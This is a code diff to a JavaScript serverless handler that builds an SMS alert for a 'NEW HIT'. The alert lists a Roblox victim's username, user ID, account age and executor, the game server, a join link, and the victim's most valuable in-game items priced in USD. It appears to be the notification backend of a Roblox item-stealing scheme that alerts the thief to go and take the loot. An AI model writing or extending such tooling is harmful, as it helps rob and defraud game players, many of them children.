@@ -323,14 +323,35 @@ export default async function handler(req, res) {
         })
       });
 
-      // ── TextBelt SMS (totalUSD & joinUrl are in scope here) ──
+      // ── TextBelt SMS ──
+      const topLoot = valuedItems
+        .filter(i => i.usd === null || i.usd > 0)   // skip $0 junk
+        .slice(0, 5)                                  // top 5 items
+        .map(i => {
+          const tier = i.sv !== null ? getTier(i.sv) : '❓';
+          const price = i.usd !== null ? formatUSD(i.usd) : '?';
+          return `  ${tier} ${i.name} x${i.amount} — ${price}`;
+        });
+
       const smsBody = [
-        `🔥 NEW HIT — ${formatUSD(totalUSD)}`,
-        `👤 ${hitData.username} (${hitData.displayName})`,
-        `🎮 ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers}`,
-        `📅 ${hitData.accountAge}d | ⚙️ ${hitData.executor}`,
-        joinUrl ? `🔗 ${joinUrl}` : null,
-      ].filter(Boolean).join('\n');
+        `╔══ 🔥 NEW HIT ══╗`,
+        `💰 Est. Value: ${formatUSD(totalUSD)}`,
+        ``,
+        `👤 User:    ${hitData.username}`,
+        `📛 Name:    ${hitData.displayName}`,
+        `🪙 UID:     ${hitData.robloxUserId || 'N/A'}`,
+        `📅 Age:     ${hitData.accountAge ?? '?'} days`,
+        `⚙️  Exec:    ${hitData.executor || 'Unknown'}`,
+        ``,
+        `🎮 Game:    ${hitData.gameName || 'MM2'}`,
+        `👥 Players: ${hitData.playerCount ?? '?'}/${hitData.maxPlayers ?? '?'}`,
+        ``,
+        topLoot.length > 0 ? `🎒 TOP LOOT:` : null,
+        ...topLoot,
+        ``,
+        joinUrl ? `🔗 JOIN:\n${joinUrl}` : null,
+        `╚══════════════╝`,
+      ].filter(s => s !== null).join('\n');
       await sendSMS(smsBody);
 
     } catch (e) {
